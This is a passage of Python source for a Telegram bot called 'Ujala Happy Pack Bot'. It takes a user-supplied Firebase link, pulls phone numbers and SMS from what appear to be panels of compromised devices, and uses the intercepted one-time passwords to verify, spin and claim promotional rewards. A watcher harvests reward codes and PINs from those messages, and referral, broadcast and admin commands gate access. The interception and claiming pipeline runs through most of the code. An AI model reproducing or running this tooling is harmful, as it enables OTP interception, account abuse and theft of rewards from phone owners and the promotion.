                logger.warning(f"OTP request attempt {_otp_get_attempt}/{OTP_GET_RETRIES} failed for {phone}: {resp}")
                if _otp_get_attempt < OTP_GET_RETRIES:
                    await asyncio.sleep(RETRY_DELAY)
            if not otp_resp:
                return {"phone": phone, "status": "failed", "reward": ""}

            # Step 3: Poll Firebase for OTP + Verify — retry OTP_VERIFY_RETRIES times
            # Each retry fetches fresh messages from Firebase first
            verify = None
            access_token = ""
            for _verify_attempt in range(1, OTP_VERIFY_RETRIES + 1):
                otp = await poll_for_otp(firebase_url, client_id, trigger_ms, http,
                                         messages_cache if _verify_attempt == 1 else None)
                if not otp:
                    logger.warning(f"OTP poll attempt {_verify_attempt}/{OTP_VERIFY_RETRIES} timed out for {phone}")
                    if _verify_attempt < OTP_VERIFY_RETRIES:
                        await asyncio.sleep(RETRY_DELAY)
                    continue
                _otp_val = otp
                _verify_resp = await api_verify_otp(phone_sess, user_key, data_key, _otp_val)
                if _verify_resp.get("statusCode") in (200, 201):
                    verify = _verify_resp
                    # Robust access_token extraction — same fallback chain as working script
                    access_token = (
                        verify.get("accessToken")
                        or verify.get("access_token")
                        or verify.get("token")
                        or ""
                    )
                    if not access_token:
                        v_data = verify.get("data") or verify.get("result") or {}
                        if isinstance(v_data, dict):
                            access_token = (
                                v_data.get("accessToken")
                                or v_data.get("access_token")
                                or v_data.get("token")
                                or ""
                            )
                    if not access_token:
                        access_token = data_key  # last resort — working script fallback
                    break
                logger.warning(f"OTP verify attempt {_verify_attempt}/{OTP_VERIFY_RETRIES} failed for {phone} (otp={_otp_val}): {_verify_resp}")
                if _verify_attempt < OTP_VERIFY_RETRIES:
                    await asyncio.sleep(RETRY_DELAY)
            if not verify:
                return {"phone": phone, "status": "otp_timeout", "reward": ""}

            # Step 4: Spin — retry SPIN_RETRIES times with delay
            spin = None
            for _spin_attempt in range(1, SPIN_RETRIES + 1):
                _spin_resp = await api_spin(phone_sess, user_key, access_token, data_key)
                if _spin_resp.get("statusCode") in (200, 201):
                    spin = _spin_resp
                    spin_trigger_ms = int(time.time() * 1000)  # reset at spin time for watcher
                    break
                logger.warning(f"Spin attempt {_spin_attempt}/{SPIN_RETRIES} failed for {phone}: {_spin_resp}")
                if _spin_attempt < SPIN_RETRIES:
                    await asyncio.sleep(SPIN_RETRY_DELAY)
            if not spin:
                return {"phone": phone, "status": "spin_failed", "reward": ""}

            await api_claim(phone_sess, user_key, access_token, data_key)
            reward = _extract_reward(spin)
            return {"phone": phone, "status": "success", "reward": str(reward),
                    "firebase_url": firebase_url, "client_id": client_id,
                    "trigger_time_ms": spin_trigger_ms}

# ============================================================
#  🏆 WINNER WATCHER (async task)
# ============================================================
async def watch_for_reward(context, uid, username, phone, firebase_url,
                           client_id, trigger_ms):
    """
    Background watcher — polls Firebase for reward SMS after a win.
    Runs independently of session — survives session end.
    First check is immediate (no sleep), then every REWARD_SMS_POLL_INTERVAL seconds.
    """
    _loop = asyncio.get_running_loop()
    deadline = _loop.time() + REWARD_SMS_MAX_WAIT

    # Notify user watcher has started
    try:
        await context.bot.send_message(
            uid,
            f"👁 <b>Watching for reward SMS</b>\n"
            f"📱 <code>{phone}</code>\n"
            f"⏳ Up to {REWARD_SMS_MAX_WAIT // 60} min...",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

    conn = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=conn) as http:
        first_check = True
        while _loop.time() < deadline:
            # Sleep AFTER first check (not before) so instant SMS isn't missed
            if not first_check:
                await asyncio.sleep(REWARD_SMS_POLL_INTERVAL)
            first_check = False

            try:
                async with http.get(f"{firebase_url}messages/{client_id}.json",
                                    timeout=aiohttp.ClientTimeout(total=15)) as r:
                    msgs = await r.json(content_type=None)
                if isinstance(msgs, dict):
                    code, pin, body = extract_reward_code_sms(msgs, trigger_ms)
                    if code:
                        db_add_winner(uid, phone, code, pin, body)
                        await notify_winner_channel(context, uid, username, phone, code, pin, body)
                        pin_line = f"🔑 PIN: <code>{pin}</code>\n" if pin else ""
                        await context.bot.send_message(
                            uid,
                            f"🏆 <b>Winner Found!</b>\n\n"
                            f"📱 Phone: <code>{phone}</code>\n"
                            f"🎁 Code: <code>{code}</code>\n"
                            f"{pin_line}"
                            f"📩 {body[:150]}",
                            parse_mode=ParseMode.HTML
                        )
                        return
            except Exception as e:
                logger.warning(f"Reward watcher error [{phone}]: {e}")

    # Timed out — notify user
    try:
        await context.bot.send_message(
            uid,
            f"⏰ <b>Reward SMS not received</b>\n"
            f"📱 <code>{phone}</code>\n"
            f"Watched for {REWARD_SMS_MAX_WAIT // 60} min — SMS did not arrive.\n"
            f"Check manually if reward was awarded.",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

# ============================================================
#  ⚙️  RUN SESSION (async task — no threads)
# ============================================================
async def run_session_task(context, uid, username, valid_urls, image_bytes, session_id):
    # Per-user lock: only one session can run at a time for this uid
    async with _get_user_lock(uid):
        await _run_session_body(context, uid, username, valid_urls, image_bytes, session_id)

async def _run_session_body(context, uid, username, valid_urls, image_bytes, session_id):
    success_count = 0
    winner_count  = 0
    results_text  = []

    # ── Live progress message — edit karte rahenge ────────────────────────
    def _bar(done, total, width=10):
        filled = int(width * done / total) if total else 0
        return "█" * filled + "░" * (width - filled)

    try:
        prog_msg = await context.bot.send_message(
            uid,
            "🔍 <b>Scanning Firebase panels...</b>",
            parse_mode=ParseMode.HTML
        )
        prog_id = prog_msg.message_id
    except Exception:
        prog_id = None

    async def _update(text):
        if not prog_id:
            return
        try:
            await context.bot.edit_message_text(
                text, chat_id=uid, message_id=prog_id,
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

    conn = aiohttp.TCPConnector(ssl=False, limit=100)
    try:
        async with aiohttp.ClientSession(connector=conn, headers=HEADERS_BASE) as http:
            for url_idx, firebase_url in enumerate(valid_urls):
                if not _active_sessions.get(uid, {}).get("running"):
                    break

                await _update(
                    f"🔍 <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                    f"Fetching devices from Firebase..."
                )

                devices = await fetch_devices_and_phones(firebase_url, http)
                if not devices:
                    results_text.append(f"⚠️ No devices: {firebase_url[:50]}")
                    await _update(
                        f"⚠️ <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                        f"No online devices found."
                    )
                    continue

                total_devices  = len(devices)
                done_devices   = 0
                total_batches  = (total_devices + BATCH_SIZE - 1) // BATCH_SIZE

                await _update(
                    f"📱 <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                    f"Found <b>{total_devices}</b> device(s) — starting...\n\n"
                    f"{_bar(0, total_devices)} 0/{total_devices}"
                )

                # Process in batches of BATCH_SIZE
                for batch_idx, i in enumerate(range(0, total_devices, BATCH_SIZE)):
                    if not _active_sessions.get(uid, {}).get("running"):
                        break

                    batch = devices[i:i + BATCH_SIZE]

                    await _update(
                        f"⚙️ <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                        f"Batch {batch_idx+1}/{total_batches} — processing {len(batch)} number(s)...\n\n"
                        f"{_bar(done_devices, total_devices)} {done_devices}/{total_devices}\n"
                        f"✅ {success_count}  🏆 {winner_count}  ❌ {len(results_text)-success_count}"
                    )

                    tasks = [
                        process_number(d["phone"], d["client_id"], d["firebase_url"],
                                       image_bytes, http, d.get("messages_cache"))
                        for d in batch
                    ]
                    batch_results = await asyncio.gather(*tasks, return_exceptions=True)

                    for result in batch_results:
                        done_devices += 1
                        if isinstance(result, Exception):
                            results_text.append(f"❌ Exception: {result}")
                            continue
                        phone  = result.get("phone", "?")
                        status = result.get("status", "failed")
                        reward = result.get("reward", "")

                        if status == "success":
                            success_count += 1
                            db_add_success(uid)
                            results_text.append(f"✅ {phone} → {reward}")
                            if is_50_rupee_reward(reward) or is_flipkart_reward(reward):
                                winner_count += 1
                                asyncio.create_task(watch_for_reward(
                                    context, uid, username, phone,
                                    result.get("firebase_url", firebase_url),
                                    result.get("client_id", ""),
                                    result.get("trigger_time_ms", int(time.time() * 1000))
                                ))
                        elif status == "already_used":
                            results_text.append(f"⏭ {phone} — already used")
                        elif status == "otp_timeout":
                            results_text.append(f"⏰ {phone} — OTP timeout")
                        else:
                            results_text.append(f"❌ {phone} — {status}")

                    # Update after each batch
                    await _update(
                        f"⚙️ <b>Panel {url_idx+1}/{len(valid_urls)}</b>\n"
                        f"Batch {batch_idx+1}/{total_batches} done\n\n"
                        f"{_bar(done_devices, total_devices)} {done_devices}/{total_devices}\n"
                        f"✅ {success_count}  🏆 {winner_count}  "
                        f"⏰ {sum(1 for r in results_text if 'OTP timeout' in r)}  "
                        f"❌ {sum(1 for r in results_text if r.startswith('❌'))}"
                    )

    except Exception as e:
        logger.error(f"Session error uid={uid}: {e}")
    finally:
        db_finish_session(session_id, success_count, winner_count)
        _active_sessions.pop(uid, None)

        summary = "\n".join(results_text[:30])
        try:
            # Delete progress message, send final summary as new message
            if prog_id:
                try:
                    await context.bot.delete_message(uid, prog_id)
                except Exception:
                    pass
            await context.bot.send_message(
                uid,
                f"✅ <b>Session Complete!</b>\n\n"
                f"✅ Success: {success_count}\n"
                f"🏆 Winners: {winner_count}\n\n"
                f"<b>Details:</b>\n{summary}",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

# ============================================================
#  🤖 BOT COMMAND HANDLERS
# ============================================================
_active_sessions: dict = {}              # uid -> {"running": bool, "session_id": int}
_user_locks: dict[int, asyncio.Lock] = {}  # per-user lock — guarantees session isolation

def _get_user_lock(uid: int) -> asyncio.Lock:
    """Return (creating if needed) the dedicated asyncio.Lock for this user."""
    if uid not in _user_locks:
        _user_locks[uid] = asyncio.Lock()
    return _user_locks[uid]

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user     = update.effective_user
    uid      = user.id
    username = user.username or ""
    name     = user.full_name or ""

    db_upsert_user(uid, username, name)

    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            try:
                referrer_id = int(arg[4:])
                if referrer_id != uid:
                    existing = db_get_user(uid)
                    if existing and existing["referred_by"] is None:
                        # Set referred_by pehle — duplicate se bachne ke liye
                        db_set_referred_by(uid, referrer_id)

                        # Channel check — agar fail ho toh bhi credit do (lenient)
                        try:
                            member_statuses = []
                            for ch in REQUIRED_CHANNELS:
                                m = await context.bot.get_chat_member(ch, uid)
                                member_statuses.append(m.status not in ("left", "kicked"))
                            new_user_joined = all(member_statuses)
                        except Exception:
                            # Check fail hua — safe side pe raho, credit mat do
                            # Jab user dobara /start karega tab pending refer check hoga
                            new_user_joined = False

                        referrer = db_get_user(referrer_id)
                        if referrer and new_user_joined:
                            _db_mark_refer_credited(uid)
                            db_add_refer_count(referrer_id)
                            referrer_updated = db_get_user(referrer_id)
                            new_count = referrer_updated["refer_count"]
                            # Har 2 refers pe 1 hour — sirf even count pe award karo
                            if new_count % 2 == 0:
                                hours_to_add = get_refer_hours(new_count)
                                new_valid = db_add_validity(referrer_id, hours_to_add)
                                logger.info(f"Refer credited: referrer={referrer_id} new_user={uid} +{hours_to_add}h (refer #{new_count})")
                                try:
                                    await context.bot.send_message(
                                        referrer_id,
                                        f"🎉 <b>Refer Successful!</b>\n\n"
                                        f"@{username or name} joined via your link.\n"
                                        f"✅ +{hours_to_add} hour(s) added! (2 refers complete)\n"
                                        f"⏰ Valid until: {datetime.fromisoformat(new_valid).strftime('%d %b %Y %H:%M')}",
                                        parse_mode=ParseMode.HTML
                                    )
                                except Exception:
                                    pass
                            else:
                                logger.info(f"Refer counted: referrer={referrer_id} new_user={uid} refer #{new_count} (1 more needed for hour)")
                                try:
                                    await context.bot.send_message(
                                        referrer_id,
                                        f"👤 <b>1 Refer Done!</b>\n\n"
                                        f"@{username or name} joined via your link.\n"
                                        f"1 aur refer karo to +1 hour milega! 🕐",
                                        parse_mode=ParseMode.HTML
                                    )
                                except Exception:
                                    pass
                        elif referrer and not new_user_joined:
                            # New user channels join nahi kiya — credit nahi, but set referred_by raha
                            logger.info(f"Refer pending: new_user={uid} hasn't joined required channels yet")
                            # Jab new user /start karega aur channels join karega, tab credit milega
            except ValueError:
                pass

    if not await check_access(update, context):
        return

    # ── Pending refer credit check ──────────────────────────────
    # Agar pehle channel join nahi tha — ab join kar liya to credit do
    row_check = db_get_user(uid)
    if row_check and row_check["referred_by"] and not row_check["refer_credited"]:
        referrer_id = row_check["referred_by"]
        referrer    = db_get_user(referrer_id)
        if referrer:
            _db_mark_refer_credited(uid)
            db_add_refer_count(referrer_id)
            referrer_updated = db_get_user(referrer_id)
            new_count = referrer_updated["refer_count"]
            if new_count % 2 == 0:
                hours_to_add = get_refer_hours(new_count)
                new_valid = db_add_validity(referrer_id, hours_to_add)
                logger.info(f"Pending refer credited: referrer={referrer_id} new_user={uid} +{hours_to_add}h (refer #{new_count})")
                try:
                    await context.bot.send_message(
                        referrer_id,
                        ("🎉 <b>Refer Successful!</b>\n\n"
                         f"@{username or name} joined via your link.\n"
                         f"✅ +{hours_to_add} hour(s) added! (2 refers complete)\n"
                         f"⏰ Valid until: {datetime.fromisoformat(new_valid).strftime('%d %b %Y %H:%M')}"),
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            else:
                logger.info(f"Refer counted: referrer={referrer_id} new_user={uid} refer #{new_count} (1 more needed)")
                try:
                    await context.bot.send_message(
                        referrer_id,
                        ("👤 <b>1 Refer Done!</b>\n\n"
                         f"@{username or name} joined via your link.\n"
                         f"1 aur refer karo to +1 hour milega! 🕐"),
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
    # ────────────────────────────────────────────────────────────

    is_valid, valid_until = db_is_valid(uid)
    row = db_get_user(uid)

    if uid in ADMIN_IDS:
        validity_text = "♾️ <b>Admin — Unlimited Access</b>"
    elif is_valid and valid_until:
        tl  = valid_until - datetime.now()
        validity_text = f"✅ Valid for: <b>{int(tl.total_seconds()//3600)}h {int((tl.total_seconds()%3600)//60)}m</b>"
    else:
        validity_text = "❌ No validity — refer karke access lo!"

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Start Session", callback_data="run"),
         InlineKeyboardButton("🔗 My Refer Link", callback_data="refer")],
        [InlineKeyboardButton("⏱ Status",          callback_data="status"),
         InlineKeyboardButton("📊 My Stats",        callback_data="stats")],
        [InlineKeyboardButton("🏆 Winners",         callback_data="winners"),
         InlineKeyboardButton("📜 History",          callback_data="history")],
        [InlineKeyboardButton("🥇 Leaderboard",     callback_data="leaderboard"),
         InlineKeyboardButton("❓ Help",             callback_data="help")],
    ])
    await update.effective_message.reply_text(
        f"👋 Welcome <b>{name}</b>!\n\n"
        f"🤖 <b>Ujala Happy Pack Bot</b>\n\n"
        f"{validity_text}\n"
        f"👥 Your refers: <b>{row['refer_count'] if row else 0}</b>\n\n"
        f"Har <b>2 refers</b> pe <b>+1 hour</b> access milta hai 🕐",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )

async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    if db_is_banned(uid):
        await update.effective_message.reply_text("🚫 You are banned.")
        return
    row  = db_get_user(uid)
    if not row:
        await update.effective_message.reply_text("Pehle /start karo.")
        return
    is_valid, valid_until = db_is_valid(uid)
    refer_url = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
    refer_count = row["refer_count"] or 0
    next_refer  = 2 - (refer_count % 2)
    if is_valid and valid_until:
        tl = valid_until - datetime.now()
        validity_text = f"\n⏰ Valid: <b>{int(tl.total_seconds()//3600)}h {int((tl.total_seconds()%3600)//60)}m remaining</b>"
    else:
        validity_text = f"\n❌ Access nahi hai — {next_refer} aur refer karo!"
    await update.effective_message.reply_text(
        f"🔗 <b>Your Refer Link</b>\n\n"
        f"<code>{refer_url}</code>\n\n"
        f"👥 Total refers: <b>{refer_count}</b>{validity_text}\n\n"
        f"📌 Har <b>2 refers</b> pe <b>+1 hour</b> access milta hai.\n"
        f"Link share karo — jab koi join kare to automatically hour milega!",
        parse_mode=ParseMode.HTML
    )

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    uid = update.effective_user.id
    is_valid, valid_until = db_is_valid(uid)
    row = db_get_user(uid)
    if uid in ADMIN_IDS:
        status_text = "♾️ <b>Admin — Unlimited Access</b>"
    elif is_valid and valid_until:
        tl = valid_until - datetime.now()
        status_text = f"✅ <b>Active</b> — {int(tl.total_seconds()//3600)}h {int((tl.total_seconds()%3600)//60)}m remaining"
    else:
        status_text = "❌ <b>Expired / No validity</b>"
    cooldown_text = ""
    ls = db_get_last_session(uid)
    if ls and uid not in ADMIN_IDS:
        remaining = datetime.fromisoformat(ls) + timedelta(minutes=COOLDOWN_MINUTES) - datetime.now()
        if remaining.total_seconds() > 0:
            cooldown_text = f"\n⏳ Cooldown: <b>{int(remaining.total_seconds()//60)}m {int(remaining.total_seconds()%60)}s</b> left"
    await update.effective_message.reply_text(
        f"📊 <b>Your Status</b>\n\nValidity: {status_text}\n"
        f"👥 Refers: <b>{row['refer_count'] if row else 0}</b>{cooldown_text}",
        parse_mode=ParseMode.HTML
    )

async def cmd_refercount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    uid = update.effective_user.id
    row = db_get_user(uid)
    cnt = row["refer_count"] if row else 0
    await update.effective_message.reply_text(
        f"👥 <b>Your Refer Count</b>\n\nTotal successful refers: <b>{cnt}</b>\nValidity earned: <b>{cnt} hour(s)</b>",
        parse_mode=ParseMode.HTML
    )

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    row = db_get_user(update.effective_user.id)
    if not row:
        await update.effective_message.reply_text("No stats yet.")
        return
    await update.effective_message.reply_text(
        f"📊 <b>Your Stats</b>\n\n"
        f"✅ Total success: <b>{row['total_success']}</b>\n"
        f"🏆 Total winners: <b>{row['total_winners']}</b>\n"
        f"👥 Total refers: <b>{row['refer_count']}</b>\n"
        f"📅 Joined: {row['joined_at'][:10]}",
        parse_mode=ParseMode.HTML
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    rows = db_get_history(update.effective_user.id)
    if not rows:
        await update.effective_message.reply_text("📜 No session history yet.")
        return
    text = "📜 <b>Last 10 Sessions</b>\n\n"
    for r in rows:
        text += (f"🗓 {r['started_at'][:16]} | Links: {r['links_count']} | "
                 f"✅ {r['success_count']} | 🏆 {r['winner_count']} | {r['status']}\n")
    await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML)

async def cmd_winners(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    rows = db_get_winners(update.effective_user.id)
    if not rows:
        await update.effective_message.reply_text("🏆 No winners found yet.")
        return
    text = "🏆 <b>Your Winners</b>\n\n"
    for r in rows:
        pin_text = f" | PIN: <code>{r['pin']}</code>" if r["pin"] else ""
        text += f"📱 {r['phone']}\n🎁 Code: <code>{r['reward_code']}</code>{pin_text}\n🕐 {r['found_at'][:16]}\n\n"
    await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML)

async def cmd_leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rows = db_get_leaderboard()
    if not rows:
        await update.effective_message.reply_text("🥇 No data yet.")
        return
    medals = ["🥇","🥈","🥉"] + ["🏅"]*7
    text   = "🥇 <b>Top Referrers</b>\n\n"
    for i, r in enumerate(rows):
        name = r["full_name"] or r["username"] or f"User {r['user_id']}"
        text += f"{medals[i]} {name} — <b>{r['refer_count']} refers</b>\n"
    await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "❓ <b>Commands</b>\n\n"
        "/start — Bot start\n/refer — Apna refer link\n/status — Validity + cooldown\n"
        "/run — Session shuru karo\n/stop — Session rokna\n/results — Session status\n"
        "/history — Last 10 sessions\n/stats — Personal stats\n/refercount — Refer count\n"
        "/winners — Tumhare winners\n/leaderboard — Top referrers\n/help — Ye list",
        parse_mode=ParseMode.HTML
    )

async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context):
        return
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS
    is_valid, _ = db_is_valid(uid)
    if not is_admin and not is_valid:
        refer_url = f"https://t.me/{BOT_USERNAME}?start=ref_{uid}"
        row = db_get_user(uid)
        refer_count = row["refer_count"] if row else 0
        next_refer = 2 - (refer_count % 2)
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Mera Refer Link", url=refer_url)]])
        await update.effective_message.reply_text(
            f"❌ <b>Access nahi hai!</b>\n\n"
            f"Har <b>2 refers</b> pe <b>+1 hour</b> milta hai.\n"
            f"👥 Tumhare refers: <b>{refer_count}</b>\n"
            f"{'🔥 1 aur refer karo!' if next_refer == 1 else f'{next_refer} aur refer karo.'}\n\n"
            f"Neeche button se link share karo 👇",
            parse_mode=ParseMode.HTML,
            reply_markup=kb
        )
        return
    ls = db_get_last_session(uid)
    if ls and not is_admin:
        remaining = datetime.fromisoformat(ls) + timedelta(minutes=COOLDOWN_MINUTES) - datetime.now()
        if remaining.total_seconds() > 0:
            await update.effective_message.reply_text(
                f"⏳ <b>Cooldown active!</b>\n\nWait <b>{int(remaining.total_seconds()//60)}m {int(remaining.total_seconds()%60)}s</b>.",
                parse_mode=ParseMode.HTML
            )
            return
    if _active_sessions.get(uid, {}).get("running"):
        await update.effective_message.reply_text("⚠️ Already have a running session. Use /stop first.")
        return
    await update.effective_message.reply_text(
        "📋 <b>Send your Firebase link</b>\n\n• Send <b>1 link only</b> per session\n• Your session is fully private\n\nType /cancel to cancel.",
        parse_mode=ParseMode.HTML
    )
    context.user_data["awaiting_links"] = True

async def handle_firebase_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_links"):
        return
    user = update.effective_user
    uid  = user.id
    text = update.message.text or ""

    if text.strip().lower() == "/cancel":
        context.user_data["awaiting_links"] = False
        await update.effective_message.reply_text("❌ Cancelled.")
        return

    valid_urls = []
    for raw in [l.strip() for l in text.splitlines() if l.strip()]:
        url = parse_firebase_link(raw)
        if url and url not in valid_urls:
            valid_urls.append(url)

    if not valid_urls:
        await update.effective_message.reply_text("⚠️ No valid Firebase link found. Send 1 Firebase link or /cancel.")
        return

    # Enforce exactly 1 link — extra links are ignored
    if len(valid_urls) > 1:
        valid_urls = valid_urls[:1]
        await update.effective_message.reply_text("⚠️ Only 1 link per session is allowed. Using the first link.")

    context.user_data["awaiting_links"] = False

    await notify_firebase_log(context, uid, user.username, valid_urls)
    db_log_firebase_link(uid, valid_urls[0])

    if not os.path.isfile(PACK_IMAGE_PATH):
        await update.effective_message.reply_text(f"❌ ujala_pack.jpg not found!\n\nPlace ujala_pack.jpg in the same folder as this Python file.\nExpected path: {PACK_IMAGE_PATH}")
        return
    with open(PACK_IMAGE_PATH, "rb") as f:
        image_bytes = f.read()

    await update.effective_message.reply_text(
        "✅ <b>Link accepted</b>\n\n🔒 Your session is private and isolated.\n⚙️ Starting... Please wait.",
        parse_mode=ParseMode.HTML
    )

    session_id = db_new_session(uid, len(valid_urls))
    db_set_last_session(uid)
    _active_sessions[uid] = {"running": True, "session_id": session_id}

    # Launch as async task — no threads needed
    asyncio.create_task(run_session_task(
        context, uid, user.username, valid_urls, image_bytes, session_id
    ))

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in _active_sessions:
        _active_sessions[uid]["running"] = False
        await update.effective_message.reply_text("⏹ Stop requested. Will finish current batch and stop.")
    else:
        await update.effective_message.reply_text("No active session found.")

async def cmd_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    info = _active_sessions.get(uid)
    if not info:
        await update.effective_message.reply_text("No session data found.")
        return
    status = "🟢 Running" if info.get("running") else "✅ Done"
    await update.effective_message.reply_text(f"Session status: {status}\nSession ID: {info.get('session_id')}")

# ── Admin Commands ─────────────────────────────────────────────
@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: /broadcast <message>")
        return
    msg  = " ".join(context.args)
    conn = get_db()
    rows = conn.execute("SELECT user_id FROM users WHERE is_banned=0").fetchall()
    conn.close()
    sent = 0
    for row in rows:
        try:
            await context.bot.send_message(row["user_id"], f"📢 <b>Broadcast</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1
        except Exception:
            pass
    await update.effective_message.reply_text(f"✅ Broadcast sent to {sent} users.")

@admin_only
async def cmd_addtime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.effective_message.reply_text("Usage: /addtime <user_id> <hours>")
        return
    try:
        target_uid = int(context.args[0])
        hours      = int(context.args[1])
    except ValueError:
        await update.effective_message.reply_text("Invalid user_id or hours.")
        return
    new_valid = db_add_validity(target_uid, hours)
    await update.effective_message.reply_text(f"✅ Added {hours}h to user {target_uid}.\nValid until: {new_valid[:16]}")
    try:
        await context.bot.send_message(
            target_uid,
            f"🎁 Admin added <b>{hours} hour(s)</b> to your account!\n"
            f"⏰ Valid until: {datetime.fromisoformat(new_valid).strftime('%d %b %Y %H:%M')}",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target_uid = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("Invalid user_id.")
        return
    db_ban_user(target_uid, True)
    await update.effective_message.reply_text(f"🚫 User {target_uid} banned.")

@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target_uid = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("Invalid user_id.")
        return
    db_ban_user(target_uid, False)
    await update.effective_message.reply_text(f"✅ User {target_uid} unbanned.")

@admin_only
async def cmd_totalusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(f"👥 Total users: <b>{db_total_users()}</b>", parse_mode=ParseMode.HTML)

@admin_only
async def cmd_activesessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active = {k: v for k, v in _active_sessions.items() if v.get("running")}
    if not active:
        await update.effective_message.reply_text("No active sessions right now.")
        return
    text = f"⚙️ <b>Active Sessions: {len(active)}</b>\n\n"
    for uid, info in active.items():
        row  = db_get_user(uid)
        name = row["full_name"] if row else str(uid)
        text += f"• {name} (ID: {uid}) — Session #{info.get('session_id')}\n"
    await update.effective_message.reply_text(text, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_alltime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /alltime +5    → sab users ko +5 hours add karo
    /alltime -3    → sab users se -3 hours ghataao
    /alltime set 8 → sab users ki validity exactly 8 hours set karo (ab se)
    """
    if not context.args:
        await update.effective_message.reply_text(
            "📋 <b>Usage:</b>\n\n"
            "/alltime +&lt;hours&gt; — Sab ko hours <b>add</b> karo\n"
            "/alltime -&lt;hours&gt; — Sab se hours <b>ghataao</b>\n"
            "/alltime set &lt;hours&gt; — Sab ki validity <b>set</b> karo (ab se)\n\n"
            "<b>Examples:</b>\n"
            "/alltime +5\n"
            "/alltime -2\n"
            "/alltime set 10",
            parse_mode=ParseMode.HTML
        )
        return

    arg = context.args[0].strip()
    mode = None
    hours = 0

    if arg.lower() == "set":
        # /alltime set <hours>
        if len(context.args) < 2:
            await update.effective_message.reply_text("Usage: /alltime set <hours>")
            return
        try:
            hours = float(context.args[1])
            mode  = "set"
        except ValueError:
            await update.effective_message.reply_text("❌ Invalid hours value.")
            return
    elif arg.startswith("+"):
        try:
            hours = float(arg[1:])
            mode  = "add"
        except ValueError:
            await update.effective_message.reply_text("❌ Invalid hours value.")
            return
    elif arg.startswith("-"):
        try:
            hours = float(arg[1:])
            mode  = "subtract"
        except ValueError:
            await update.effective_message.reply_text("❌ Invalid hours value.")
            return
    else:
        await update.effective_message.reply_text(
            "❌ Format sahi nahi hai.\n\nUse: /alltime +5 | /alltime -3 | /alltime set 8"
        )
        return

    if hours <= 0:
        await update.effective_message.reply_text("❌ Hours 0 se zyada honi chahiye.")
        return

    # Process all non-banned users
    conn = get_db()
    users = conn.execute(
        "SELECT user_id FROM users WHERE is_banned=0"
    ).fetchall()
    conn.close()

    if not users:
        await update.effective_message.reply_text("No users found.")
        return

    now = datetime.now()
    updated = 0
    conn = get_db()

    for u in users:
        uid = u["user_id"]
        if uid in ADMIN_IDS:
            continue  # admins ko skip karo

        if mode == "add":
            # Current validity pe add karo
            row = conn.execute("SELECT valid_until FROM users WHERE user_id=?", (uid,)).fetchone()
            if row and row["valid_until"]:
                try:
                    base = max(datetime.fromisoformat(row["valid_until"]), now)
                except Exception:
                    base = now
            else:
                base = now
            new_valid = (base + timedelta(hours=hours)).isoformat()

        elif mode == "subtract":
            # Current validity se ghataao
            row = conn.execute("SELECT valid_until FROM users WHERE user_id=?", (uid,)).fetchone()
            if row and row["valid_until"]:
                try:
                    current = datetime.fromisoformat(row["valid_until"])
                    new_dt  = current - timedelta(hours=hours)
                    # Minimum = now (expired)
                    new_valid = max(new_dt, now - timedelta(seconds=1)).isoformat()
                except Exception:
                    new_valid = now.isoformat()
            else:
                new_valid = now.isoformat()

        elif mode == "set":
            # Ab se exactly X hours
            new_valid = (now + timedelta(hours=hours)).isoformat()

        conn.execute("UPDATE users SET valid_until=? WHERE user_id=?", (new_valid, uid))
        updated += 1

